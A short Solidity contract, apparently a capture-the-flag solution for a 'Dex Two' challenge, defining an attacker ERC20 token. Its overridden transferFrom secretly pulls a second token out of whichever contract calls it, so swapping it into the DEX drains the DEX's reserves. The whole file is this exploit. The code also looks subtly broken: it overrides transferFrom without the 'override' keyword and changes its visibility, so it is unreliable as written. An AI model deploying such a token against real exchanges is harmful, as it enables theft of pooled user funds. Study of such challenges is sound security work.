pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttackerToken1 is ERC20 {
    address public immutable dexInstance;
    address public immutable token2;


    constructor(address _dexInstance, address _token2, string memory name, string memory symbol, uint256 supply) ERC20(name, symbol) {
        _mint(msg.sender, supply);
        dexInstance = _dexInstance;
        token2 = _token2;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        IERC20(token2).transferFrom(msg.sender, to, amount);
        return super.transferFrom(from, to, amount);
    }
}
